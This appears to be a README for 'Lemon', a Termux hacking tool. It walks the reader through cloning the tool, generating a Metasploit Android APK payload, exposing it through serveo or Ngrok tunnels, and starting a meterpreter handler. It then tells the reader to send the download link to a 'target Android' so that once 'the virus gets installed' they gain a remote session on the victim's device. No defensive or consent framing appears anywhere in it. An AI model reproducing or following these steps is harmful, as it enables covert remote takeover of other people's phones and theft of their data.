**Requirements :-**

1.Metasploit-Framework

2.git

**Installation :-**

1.Install git by typing "pkg install git"

2.Download Lemon by typing "git clone https://github.com/Lemon-Hacking/Lemon

3.Install it by executing "cd $HOME/Lemon && sh Install" without quotes.

**How to use :-**

1.Run php by typing "sh php"

2.Run ssh by typing "sh ssh" and copy the link you get.   [NEW SESSION]

3.Forward TCP connections by typing "sh payload", type a name for your payload followed by ".apk" at the end, then choose a port of your own and choose a forwarding service, specify if you already have Ngrok or not, serveo requires no installation. It will take a little time to create and upload the payload with the specified port and name.

4.Type "sh Handler" and read the info carefully. Now wait for the Handler to start, then type "set LHOST xxxx" and "set LPORT xxxx". Put the correct port and host according to the instructions, and finally type "run"   [NEW SESSION]

5.Now, put your payload's name after the link that you got after running "sh ssh" [For Example : lente.serveo.net/Name.apk] and send the link to the target Android, once the virus gets installed in the target device, you will see a meterpreter session opening, wait for a few seconds.
  Type "?" and press enter. Now you can mess with the Android device using the commnands listed.
